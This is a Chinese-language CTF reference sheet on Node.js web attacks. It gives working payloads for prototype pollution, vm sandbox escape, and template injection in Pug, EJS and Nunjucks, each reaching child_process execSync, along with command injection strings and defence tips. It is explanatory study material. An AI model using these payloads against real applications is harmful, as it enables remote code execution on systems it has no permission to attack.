# Node.js 安全

## 概述

Node.js 在 CTF Web 题中出现的频率日益增加，涉及原型链污染、VM 沙箱逃逸、模板注入（Pug、EJS、Nunjucks）、命令执行等。Node.js 的异步特性和 JavaScript 的动态特性提供了独特的攻击面。

## 常见攻击手法

### 1. 原型链污染

原型链污染（Prototype Pollution）是 Node.js 中危害最大的漏洞类型之一。

- **原理**：当程序不安全的递归合并对象时（如 `lodash.merge()`、`$.extend()`、`Object.assign()`），攻击者可通过修改 `__proto__` 或 `constructor.prototype` 来污染 `Object.prototype`。

- **触发条件**：
  ```javascript
  // 存在漏洞的 merge 函数
  function merge(a, b) {
    for (let key in b) {
      if (isObject(a[key])) {
        merge(a[key], b[key]);
      } else {
        a[key] = b[key];
      }
    }
  }
  merge({}, JSON.parse('{"__proto__":{"admin":true}}'));
  ```

- **典型利用**：
  - 修改全局配置（如设置 `admin=true`）
  - 覆盖认证逻辑（`auth.verify` 被替换）
  - 配合模板引擎 RCE（如通过 `options` 对象注入）
  - 污染 `Object.prototype` 上的 `shell` 属性配合 `child_process.exec()` 实现 RCE（如 `vm2` 沙箱逃逸）

- **常用 Payload**：
  ```json
  {"__proto__": {"block": {"type": "Text", "line": "process.mainModule.require('child_process').execSync('id')"}}}
  ```

### 2. VM 沙箱逃逸

Node.js 的 `vm` 模块用于创建隔离的 JS 运行环境，但历史上多次被绕过。

- **vm.runInNewContext()**：通过构造函数逃逸
  ```javascript
  const vm = require('vm');
  vm.runInNewContext('this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id")');
  ```

- **vm2 逃逸**：`vm2` 是一个更安全的沙箱库，但仍存在多个逃逸漏洞（CVE-2022-36067、CVE-2023-32314 等）
  - 利用异常处理：`try { throw new Error(); } catch (e) { e.constructor.constructor('return process').call(this); }`
  - 利用 Proxy 和 Promise
  - 利用 WeakMap 和 Symbol

### 3. 模板注入 (SSTI)

- **Pug SSTI**：
  - Pug 中嵌入 JS 代码：`#{7*7}`、`!{userInput}`
  - 利用：`#{global.process.mainModule.require('child_process').execSync('id')}`
  - Pug 的 `res.render()` 若直接传递用户输入到模板变量中可能导致代码执行

- **EJS SSTI**：
  - EJS 的 `<%=` 输出转义内容，`<%-` 输出原始内容
  - `res.render()` 的第二个参数若包含 `settings['view options']['client']=true` 可触发 RCE
  - Payload：`{"delimiter":"?","client":true,"debug":true,"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');//"}`

- **Nunjucks SSTI**：
  - `{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}`

### 4. 命令执行

- **child_process 模块**：`exec()`、`execSync()`、`spawn()`、`fork()`
- **命令注入**：`exec('ping ' + userInput)` 中注入 `; id`、`|| id`、`| id`、`$(id)`
- **代码执行**：`eval()`、`setTimeout()`、`setInterval()`、`new Function()`
- **利用 npm 脚本**：`scripts` 字段中的 `postinstall`、`preinstall` 等生命周期钩子

### 5. 语言特性

- **大小写特性**：Node.js 的 `child_process` 模块在非 Windows 系统大小写敏感，在某些场景可利用此差异绕过过滤
- **HTTP 参数解析差异**：Express.js 的 `req.query.obj` 可解析 `obj[key]=value` 为对象（qs 库特性）
- **异步错误处理**：未捕获的异常可能导致信息泄露

### 6. 路由与中间件

- **路由顺序漏洞**：Express 路由匹配顺序可能导致认证绕过
- **错误处理中间件**：4 个参数的中间件 `(err, req, res, next)` 可捕获异常，但若未注册则错误信息直接暴露

## 相关工具

| 工具 | 用途 |
|------|------|
| pp-detector | 原型链污染检测 |
| vm2-escape | vm2 沙箱逃逸 payload 收集 |
| Node.js Inspector | 调试与代码分析 |

## 防御建议

- 避免使用递归合并函数处理用户输入
- 使用 `Object.create(null)` 创建无原型对象
- 更新 `vm2` 到最新版本或使用 `isolated-vm` 替代
- 模板引擎避免直接渲染用户控制的字符串

## CTF 中的常见考点

- 原型链污染修改 `Object.prototype` 绕过认证
- EJS/Pug SSTI 获取 RCE
- vm2 沙箱逃逸执行系统命令
- `__proto__` 注入修改模板引擎配置

## 相关技能

- [PHP](PHP.md)
- [Python](Python.md)
- [JS](JS.md)
- [原型链污染](Node.md)
- [VM沙箱逃逸](Node.md)
- [高级语言逆向](../逆向工程/高级语言逆向.md)
